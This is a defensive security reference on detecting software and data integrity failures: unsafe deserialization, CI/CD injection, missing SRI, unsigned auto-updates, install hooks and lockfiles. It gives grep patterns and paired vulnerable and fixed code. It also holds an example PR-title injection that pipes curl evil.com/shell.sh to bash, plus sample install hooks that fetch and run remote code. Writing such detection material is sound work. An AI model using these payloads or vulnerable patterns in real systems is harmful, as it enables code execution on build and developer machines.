# Integrity Detection Patterns

Grep heuristics, language-specific code examples, scanner coverage, and false positive
guidance for identifying A08:2021 Software and Data Integrity Failures.

---

## Pattern 1: Unsafe Deserialization

### Description

Deserializing data from untrusted sources using formats that support arbitrary object
instantiation (Python pickle, Java ObjectInputStream, Ruby Marshal, PHP unserialize,
YAML with full loader) enables remote code execution. An attacker crafts a serialized
payload that executes system commands when deserialized.

### Grep Heuristics

```
# Python pickle/marshal
pickle\.(loads?|Unpickler)\(
marshal\.loads?\(
shelve\.open\(
_pickle\.loads?\(
cPickle\.loads?\(
dill\.loads?\(

# Python YAML without SafeLoader
yaml\.load\((?!.*Loader\s*=\s*yaml\.SafeLoader)(?!.*SafeLoader)
yaml\.unsafe_load\(
yaml\.full_load\(

# Java deserialization
ObjectInputStream|readObject\(\)
XMLDecoder|readObject
XStream\.fromXML\(
SerializationUtils\.deserialize\(
\.readUnshared\(\)

# JavaScript/TypeScript
node-serialize|serialize\.unserialize
js-yaml\.load\((?!.*schema:\s*SAFE_SCHEMA)
funcster|cryo\.parse
eval\(.*JSON\.parse

# Go
gob\.NewDecoder\(.*\.Decode\(
encoding/gob
```

### Language Examples

**Python (vulnerable)**:
```python
import pickle

def import_data(request):
    uploaded = request.files["data"]
    data = pickle.loads(uploaded.read())
    return process(data)
```

**Python (fixed)**:
```python
import json

def import_data(request):
    uploaded = request.files["data"]
    data = json.loads(uploaded.read())
    # Validate schema before processing
    validate_schema(data)
    return process(data)
```

**Python YAML (vulnerable)**:
```python
import yaml

def load_config(user_input):
    config = yaml.load(user_input)  # No SafeLoader — allows !!python/object
    return config
```

**Python YAML (fixed)**:
```python
import yaml

def load_config(user_input):
    config = yaml.load(user_input, Loader=yaml.SafeLoader)
    return config
```

**JavaScript/TypeScript (vulnerable)**:
```typescript
import serialize from "node-serialize";

app.post("/import", (req, res) => {
  const data = serialize.unserialize(req.body.payload);
  res.json(process(data));
});
```

**JavaScript/TypeScript (fixed)**:
```typescript
app.post("/import", (req, res) => {
  const data = JSON.parse(req.body.payload);
  const validated = schema.validate(data);  // Use Zod, Joi, etc.
  if (!validated.success) return res.status(400).json({ error: "Invalid data" });
  res.json(process(validated.data));
});
```

**Java (vulnerable)**:
```java
public Object deserialize(InputStream input) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(input);
    return ois.readObject();  // Arbitrary class instantiation
}
```

**Java (fixed)**:
```java
import org.apache.commons.io.serialization.ValidatingObjectInputStream;

public Object deserialize(InputStream input) throws Exception {
    ValidatingObjectInputStream ois = new ValidatingObjectInputStream(input);
    ois.accept(AllowedClass1.class, AllowedClass2.class);  // Allowlist
    return ois.readObject();
}
```

**Go (vulnerable)**:
```go
func HandleImport(w http.ResponseWriter, r *http.Request) {
    dec := gob.NewDecoder(r.Body)
    var data UserData
    dec.Decode(&data)  // gob from untrusted source
    process(data)
}
```

**Go (fixed)**:
```go
func HandleImport(w http.ResponseWriter, r *http.Request) {
    var data UserData
    if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
        http.Error(w, "Invalid JSON", http.StatusBadRequest)
        return
    }
    if err := validate(data); err != nil {
        http.Error(w, "Validation failed", http.StatusBadRequest)
        return
    }
    process(data)
}
```

### Scanner Coverage

- **semgrep**: Excellent. Rules for pickle, YAML, Java ObjectInputStream, node-serialize across languages
- **bandit**: Good. B301 (pickle), B506 (yaml.load without SafeLoader), B302 (marshal)
- **spotbugs**: Detects Java deserialization with Find Security Bugs plugin
- **gosec**: Limited deserialization coverage for Go

### False Positive Guidance

- `pickle.loads` on data from a trusted internal source (e.g., Redis cache populated only by the same application) is lower risk but still a finding (defense in depth). Flag as **MEDIUM**.
- `yaml.load` with `Loader=yaml.SafeLoader` or `yaml.safe_load()` is safe. Do not flag these.
- Java deserialization with an allowlist/lookup filter (e.g., Apache Commons `ValidatingObjectInputStream`) is mitigated. Note as **LOW** if the allowlist is appropriately restrictive.
- Test fixtures using pickle or YAML for convenience are **LOW** if they only load from checked-in test data files.

### Severity Criteria

- **CRITICAL**: Deserialization of data directly from HTTP requests, file uploads, message queues, or any external source without allowlisting.
- **HIGH**: Deserialization of data from semi-trusted sources (internal services, databases) that could be compromised.
- **MEDIUM**: Deserialization from trusted internal sources with no validation but limited attack surface.
- **LOW**: Deserialization in test code or from checked-in fixture files.

---

## Pattern 2: CI/CD Pipeline Injection via Untrusted Inputs

### Description

CI/CD workflows that interpolate untrusted input -- such as PR titles, branch names,
commit messages, or issue bodies -- into shell `run:` blocks are vulnerable to command
injection. An attacker crafts a PR title like `"; curl evil.com/shell.sh | bash; #`
to execute arbitrary commands in the build environment.

### Grep Heuristics

```
# GitHub Actions: untrusted context in run blocks
\$\{\{\s*github\.event\.(pull_request\.(title|body|head\.ref)|issue\.(title|body)|comment\.body|review\.body)
\$\{\{\s*github\.head_ref\s*\}\}
\$\{\{\s*github\.event\..*\.name\s*\}\}

# GitLab CI: variable interpolation from merge request
\$CI_MERGE_REQUEST_TITLE|\$CI_COMMIT_MESSAGE
\$\{CI_MERGE_REQUEST_TITLE\}|\$\{CI_COMMIT_MESSAGE\}

# Generic: untrusted env vars in shell commands
echo\s+\$\{?\{?github\.|run:.*\$\{\{
```

### Language Examples

**GitHub Actions (vulnerable)**:
```yaml
name: PR Check
on: pull_request

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Log PR title
        run: |
          echo "Processing PR: ${{ github.event.pull_request.title }}"
          echo "Branch: ${{ github.head_ref }}"
```

**GitHub Actions (fixed)**:
```yaml
name: PR Check
on: pull_request

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Log PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          BRANCH_NAME: ${{ github.head_ref }}
        run: |
          echo "Processing PR: ${PR_TITLE}"
          echo "Branch: ${BRANCH_NAME}"
```

**GitLab CI (vulnerable)**:
```yaml
check_mr:
  script:
    - echo "MR title is ${CI_MERGE_REQUEST_TITLE}"
    - ./scripts/validate.sh "${CI_MERGE_REQUEST_TITLE}"
```

**GitLab CI (fixed)**:
```yaml
check_mr:
  script:
    - echo "MR title is ${CI_MERGE_REQUEST_TITLE}"  # Safe in echo
    - ./scripts/validate.sh  # Read title from CI API instead of shell interpolation
  variables:
    MR_TITLE: ${CI_MERGE_REQUEST_TITLE}
```

**Jenkinsfile (vulnerable)**:
```groovy
pipeline {
    stages {
        stage('Build') {
            steps {
                sh "echo Building ${env.CHANGE_TITLE}"
            }
        }
    }
}
```

**Jenkinsfile (fixed)**:
```groovy
pipeline {
    stages {
        stage('Build') {
            steps {
                sh '''
                    echo "Building PR"
                    # Use API to fetch title safely
                '''
            }
        }
    }
}
```

### Scanner Coverage

- **semgrep**: Good coverage with `yaml.github-actions.security.*` rules
- **checkov**: Detects some GitHub Actions misconfigurations
- **Best detected by**: Claude analysis of workflow YAML files, tracing `${{ }}` expressions into `run:` blocks

### False Positive Guidance

- `${{ github.event.pull_request.title }}` used as an input to a GitHub Action (in `with:` block) rather than in a `run:` block is generally safe, depending on how the action processes it.
- `${{ github.sha }}` and `${{ github.run_id }}` are safe -- they are controlled by GitHub, not by PR authors.
- `${{ secrets.* }}` references are safe (they cannot be set by PR authors on fork PRs).
- Workflows that only trigger on `push` to protected branches (not `pull_request` or `pull_request_target`) have a smaller attack surface since the attacker must have write access.

### Severity Criteria

- **CRITICAL**: Untrusted input (`pull_request.title`, `head_ref`, `issue.body`) directly in a `run:` block in a workflow triggered by `pull_request_target` (runs with repo secrets).
- **HIGH**: Untrusted input in `run:` block in `pull_request`-triggered workflow (runs in fork context but can exfiltrate build artifacts).
- **MEDIUM**: Untrusted input in `run:` block but only in workflows triggered by maintainer actions (e.g., `issue_comment` from collaborators).
- **LOW**: Untrusted input logged but not executed (e.g., `echo` only, no piping to shell commands).

---

## Pattern 3: CDN Scripts Without Subresource Integrity (SRI)

### Description

Loading JavaScript or CSS from third-party CDNs without `integrity` attributes means
a compromised or hijacked CDN can serve malicious code to all users. SRI hashes ensure
the browser verifies the file content matches the expected hash before executing it.

### Grep Heuristics

```
# Script/link tags from CDNs without integrity attribute
<script\s+src=["']https?://(cdn|unpkg|cdnjs|jsdelivr|ajax\.googleapis|stackpath|maxcdn|cloudflare)
<link\s+.*href=["']https?://(cdn|unpkg|cdnjs|jsdelivr|ajax\.googleapis|stackpath|maxcdn|cloudflare)

# Then verify absence of integrity attribute on the same tag
# If the tag has src/href pointing to a CDN but no integrity= attribute, flag it
```

For each match, check if `integrity=` appears on the same element. If absent, flag it.

### Language Examples

**HTML (vulnerable)**:
```html
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
```

**HTML (fixed)**:
```html
<script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"
        integrity="sha384-OYpMh9v1cR0LrBmGFBQ/bKmBk0Le1G9Z6BOhXVs1KDA3Tl6OIz0E3UfNlPjNI3E"
        crossorigin="anonymous"></script>
<link rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css"
      integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
      crossorigin="anonymous">
```

**JSX/TSX (vulnerable)**:
```tsx
function App() {
  return (
    <head>
      <script src="https://unpkg.com/react@18/umd/react.production.min.js" />
    </head>
  );
}
```

**JSX/TSX (fixed)**:
```tsx
function App() {
  return (
    <head>
      <script
        src="https://unpkg.com/react@18/umd/react.production.min.js"
        integrity="sha384-..."
        crossOrigin="anonymous"
      />
    </head>
  );
}
```

**Python template (vulnerable)**:
```python
# Jinja2 / Django template
BOOTSTRAP_CDN = "https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
# Template: <script src="{{ BOOTSTRAP_CDN }}"></script>
```

**Python template (fixed)**:
```python
BOOTSTRAP_CDN = "https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
BOOTSTRAP_SRI = "sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
# Template: <script src="{{ BOOTSTRAP_CDN }}" integrity="{{ BOOTSTRAP_SRI }}" crossorigin="anonymous"></script>
```

### Scanner Coverage

- **semgrep**: Some rules for missing SRI in HTML files
- **checkov**: Not applicable (IaC focus)
- **Best detected by**: Grep for CDN URLs in HTML/template files, then check for missing `integrity` attribute

### False Positive Guidance

- Resources loaded from the same origin (same domain) do not need SRI. Only flag cross-origin CDN resources.
- Dynamically loaded scripts (e.g., via `document.createElement("script")`) cannot use SRI attributes directly but should use other integrity verification mechanisms.
- Some CDNs serve dynamic content (e.g., API endpoints) where SRI is not applicable. Only flag static asset references (.js, .css, .woff, .woff2).
- Development-only pages or admin dashboards that are not publicly accessible are lower priority.

### Severity Criteria

- **HIGH**: Production HTML pages loading JavaScript from third-party CDNs without SRI. Compromised JS can steal credentials, modify DOM, or exfiltrate data.
- **MEDIUM**: Production pages loading CSS from CDNs without SRI. Compromised CSS can exfiltrate data via CSS injection but impact is more limited.
- **LOW**: Non-production pages (admin panels, internal tools) loading CDN resources without SRI.

---

## Pattern 4: Auto-Update Without Signature Verification

### Description

Applications that download and execute updates, plugins, or extensions without
verifying digital signatures or cryptographic checksums can be tricked into running
malicious code through DNS hijacking, MITM attacks, or compromised update servers.

### Grep Heuristics

```
# Download-and-execute patterns
(urllib|requests|http|fetch|curl|wget)\b.*\.(download|get)\(.*\b(update|plugin|extension|module|patch)
(exec|spawn|system|popen|subprocess)\b.*\b(update|install|upgrade)
eval\(.*fetch\(|eval\(.*request
download.*exec|download.*run|download.*install
auto.?update|self.?update|check.?update

# Then look for absence of verification
# Verify these keywords are NOT near the download:
(verify|signature|sign|checksum|sha256|sha384|sha512|gpg|pgp|sigstore|cosign)
```

### Language Examples

**Python (vulnerable)**:
```python
import requests
import subprocess

def auto_update():
    response = requests.get("https://updates.example.com/latest.tar.gz")
    with open("/tmp/update.tar.gz", "wb") as f:
        f.write(response.content)
    subprocess.run(["tar", "xzf", "/tmp/update.tar.gz", "-C", "/opt/app"])
    subprocess.run(["/opt/app/install.sh"])
```

**Python (fixed)**:
```python
import requests
import subprocess
import hashlib
import gnupg

def auto_update():
    response = requests.get("https://updates.example.com/latest.tar.gz")
    sig_response = requests.get("https://updates.example.com/latest.tar.gz.sig")

    # Verify GPG signature
    gpg = gnupg.GPG()
    verified = gpg.verify(sig_response.content, data=response.content)
    if not verified:
        raise SecurityError("Update signature verification failed")

    with open("/tmp/update.tar.gz", "wb") as f:
        f.write(response.content)
    subprocess.run(["tar", "xzf", "/tmp/update.tar.gz", "-C", "/opt/app"])
    subprocess.run(["/opt/app/install.sh"])
```

**JavaScript/TypeScript (vulnerable)**:
```typescript
async function checkForUpdates() {
  const response = await fetch("https://updates.example.com/manifest.json");
  const manifest = await response.json();
  if (manifest.version > currentVersion) {
    const update = await fetch(manifest.downloadUrl);
    const buffer = await update.arrayBuffer();
    fs.writeFileSync(updatePath, Buffer.from(buffer));
    execSync(`chmod +x ${updatePath} && ${updatePath}`);
  }
}
```

**JavaScript/TypeScript (fixed)**:
```typescript
import { createVerify } from "crypto";

async function checkForUpdates() {
  const response = await fetch("https://updates.example.com/manifest.json");
  const manifest = await response.json();
  if (manifest.version > currentVersion) {
    const update = await fetch(manifest.downloadUrl);
    const buffer = await update.arrayBuffer();

    // Verify Ed25519 signature
    const verify = createVerify("ed25519");
    verify.update(Buffer.from(buffer));
    if (!verify.verify(PUBLIC_KEY, manifest.signature, "base64")) {
      throw new Error("Update signature verification failed");
    }

    fs.writeFileSync(updatePath, Buffer.from(buffer));
    execSync(`chmod +x ${updatePath} && ${updatePath}`);
  }
}
```

**Java (vulnerable)**:
```java
public void applyUpdate(String updateUrl) throws Exception {
    URL url = new URL(updateUrl);
    try (InputStream in = url.openStream()) {
        Files.copy(in, Paths.get("/opt/app/update.jar"), StandardCopyOption.REPLACE_EXISTING);
    }
    Runtime.getRuntime().exec("java -jar /opt/app/update.jar");
}
```

**Java (fixed)**:
```java
public void applyUpdate(String updateUrl, String signatureUrl) throws Exception {
    URL url = new URL(updateUrl);
    byte[] updateBytes;
    try (InputStream in = url.openStream()) {
        updateBytes = in.readAllBytes();
    }

    URL sigUrl = new URL(signatureUrl);
    byte[] signature;
    try (InputStream in = sigUrl.openStream()) {
        signature = in.readAllBytes();
    }

    Signature sig = Signature.getInstance("SHA256withRSA");
    sig.initVerify(trustedPublicKey);
    sig.update(updateBytes);
    if (!sig.verify(signature)) {
        throw new SecurityException("Update signature verification failed");
    }

    Files.write(Paths.get("/opt/app/update.jar"), updateBytes);
    Runtime.getRuntime().exec("java -jar /opt/app/update.jar");
}
```

**Go (vulnerable)**:
```go
func autoUpdate(updateURL string) error {
    resp, err := http.Get(updateURL)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    binary, _ := io.ReadAll(resp.Body)
    os.WriteFile("/usr/local/bin/myapp", binary, 0755)
    return exec.Command("/usr/local/bin/myapp", "--post-update").Run()
}
```

**Go (fixed)**:
```go
func autoUpdate(updateURL, signatureURL string, publicKey ed25519.PublicKey) error {
    resp, err := http.Get(updateURL)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    binary, _ := io.ReadAll(resp.Body)

    sigResp, _ := http.Get(signatureURL)
    defer sigResp.Body.Close()
    signature, _ := io.ReadAll(sigResp.Body)

    if !ed25519.Verify(publicKey, binary, signature) {
        return errors.New("update signature verification failed")
    }

    os.WriteFile("/usr/local/bin/myapp", binary, 0755)
    return exec.Command("/usr/local/bin/myapp", "--post-update").Run()
}
```

### Scanner Coverage

- **semgrep**: Limited coverage for auto-update patterns (application-specific logic)
- **trivy**: Not applicable (focuses on known CVEs)
- **Best detected by**: Claude analysis of update/install flows, tracing download-to-execute paths

### False Positive Guidance

- Package managers (npm, pip, apt) have their own integrity verification. Using `npm install` or `pip install` is not a finding; only custom update mechanisms need scrutiny.
- HTTPS-only downloads provide transport security but not integrity verification against a compromised server. HTTPS alone is insufficient -- flag as **MEDIUM** if no signature check exists even over HTTPS.
- Downloading files for display/storage (e.g., user avatars, documents) that are not executed is not this pattern.

### Severity Criteria

- **CRITICAL**: Download-and-execute pattern with no integrity verification, especially if the update URL can be influenced by an attacker.
- **HIGH**: Update mechanism uses HTTPS but no signature/checksum verification. Compromised server or MITM on TLS termination can inject code.
- **MEDIUM**: Checksum verification present but uses a weak algorithm (MD5, SHA1) or the checksum is fetched from the same server as the update.
- **LOW**: Updates are verified but the public key or checksum is embedded in the same codebase (could be modified if the repo is compromised).

---

## Pattern 5: Pre/Post-Install Scripts in Dependencies

### Description

Package managers allow dependencies to execute arbitrary scripts during installation
(`preinstall`, `postinstall` in npm; `setup.py` with `cmdclass` in Python; build
scripts in other ecosystems). Malicious packages exploit this to run code on developer
and CI machines at install time.

### Grep Heuristics

```
# npm: pre/post install scripts in package.json
"(preinstall|postinstall|preuninstall|postuninstall|prepare|prepublish)"\s*:\s*"

# Python: setup.py with custom install commands
cmdclass\s*=|install\.run\(|setup\(.*cmdclass
class\s+\w+Install\(install\)

# Ruby: Gemspec extensions
extensions\s*=.*\.rb
ext_conf\.rb

# Cargo build scripts (less common attack vector but worth noting)
build\s*=\s*"build\.rs"
```

### Language Examples

**npm package.json (suspicious)**:
```json
{
  "name": "helpful-utility",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "node scripts/setup.js",
    "postinstall": "curl https://example.com/telemetry | node"
  }
}
```

**npm package.json (safer)**:
```json
{
  "name": "helpful-utility",
  "version": "1.0.0",
  "scripts": {
    "prepare": "npm run build",
    "build": "tsc"
  }
}
```

**Python setup.py (suspicious)**:
```python
from setuptools import setup
from setuptools.command.install import install
import subprocess

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.call(["curl", "https://example.com/payload", "-o", "/tmp/p"])
        subprocess.call(["python", "/tmp/p"])

setup(
    name="helpful-package",
    cmdclass={"install": PostInstall},
)
```

**Python setup.py (safer)**:
```python
from setuptools import setup

setup(
    name="helpful-package",
    # No custom install commands
    # Use pyproject.toml build system instead of setup.py when possible
)
```

### Scanner Coverage

- **npm audit**: Does not check for malicious install scripts (only known CVEs)
- **semgrep**: Can detect suspicious patterns in package.json and setup.py
- **socket.dev**: Specifically designed for detecting supply chain attacks in npm (external service)
- **Best detected by**: Grep for install hooks in dependency configs, Claude analysis of what the scripts do

### False Positive Guidance

- Many legitimate packages use `postinstall` for building native addons (e.g., `node-gyp rebuild`), downloading platform-specific binaries (e.g., `esbuild`, `swc`), or running `husky install` for git hooks. Evaluate what the script does, not just its existence.
- `prepare` scripts that run `build` or `compile` commands are standard practice.
- First-party `package.json` install scripts (in the root project, not in `node_modules`) are controlled by the project team and are lower risk.

### Severity Criteria

- **HIGH**: Third-party dependency with install scripts that download and execute remote code, or execute obfuscated commands.
- **MEDIUM**: Third-party dependency with install scripts that execute local scripts doing non-obvious operations (e.g., modifying files outside the package directory).
- **LOW**: Third-party dependency with install scripts that perform standard build operations (compiling native code, downloading prebuilt binaries from the package's own release page).

---

## Pattern 6: Missing Lockfile Integrity

### Description

Dependency lockfiles (`package-lock.json`, `yarn.lock`, `Pipfile.lock`, `go.sum`,
`Cargo.lock`) pin exact dependency versions and their integrity hashes. Missing
lockfiles or lockfiles without integrity hashes allow silent dependency substitution
through version range resolution or registry manipulation.

### Grep Heuristics

```
# Check for lockfile existence (use Glob, not Grep)
# package-lock.json, yarn.lock, pnpm-lock.yaml
# Pipfile.lock, poetry.lock
# go.sum
# Cargo.lock
# composer.lock
# Gemfile.lock

# Check .gitignore for ignored lockfiles (BAD practice)
# In .gitignore:
package-lock\.json|yarn\.lock|pnpm-lock\.yaml
Pipfile\.lock|poetry\.lock
go\.sum
Cargo\.lock
composer\.lock
Gemfile\.lock

# Check package-lock.json for missing integrity fields
# In package-lock.json, each package should have an "integrity" field:
"integrity":\s*"sha
```

### Language Examples

**Node.js .gitignore (vulnerable)**:
```
node_modules/
package-lock.json
```

**Node.js .gitignore (fixed)**:
```
node_modules/
# package-lock.json MUST be committed for reproducible builds
```

**Python (vulnerable -- no lockfile)**:
```
# requirements.txt with unpinned versions
flask>=2.0
requests
sqlalchemy
```

**Python (fixed -- pinned with hashes)**:
```
# requirements.txt with pinned versions and hashes
flask==3.0.0 --hash=sha256:...
requests==2.31.0 --hash=sha256:...
sqlalchemy==2.0.23 --hash=sha256:...
```

**Go (vulnerable -- go.sum missing from git)**:
```
# .gitignore
go.sum
```

**Go (fixed)**:
```
# .gitignore
# go.sum MUST be committed -- it contains expected hashes of all dependencies
```

**Dockerfile (vulnerable)**:
```dockerfile
FROM node:20
COPY package.json .
RUN npm install
```

**Dockerfile (fixed)**:
```dockerfile
FROM node:20
COPY package.json package-lock.json .
RUN npm ci
```

### Scanner Coverage

- **trivy**: Can detect missing lockfiles and dependency issues
- **checkov**: Can detect Dockerfile best practices (using `npm ci` vs `npm install`)
- **Best detected by**: Glob for lockfile existence, Grep .gitignore for ignored lockfiles, Claude analysis of Dockerfile COPY/RUN patterns

### False Positive Guidance

- Some monorepo setups use workspace-level lockfiles rather than per-package lockfiles. Check the workspace root before flagging individual packages.
- Libraries (as opposed to applications) sometimes intentionally omit lockfiles so that CI tests against the latest compatible versions. This is a deliberate trade-off, not a vulnerability. Flag as **LOW** with a note.
- `go.sum` may appear missing if the project uses Go workspace mode (`go.work.sum` instead). Check for workspace files.

### Severity Criteria

- **HIGH**: No lockfile exists and no pinned versions in the dependency manifest. Builds are non-reproducible and vulnerable to dependency confusion.
- **MEDIUM**: Lockfile exists but is listed in `.gitignore`, so it is not committed to version control.
- **MEDIUM**: Dockerfile uses `npm install` instead of `npm ci`, ignoring the lockfile.
- **LOW**: Lockfile exists and is committed but some entries lack integrity hashes (older lockfile format).
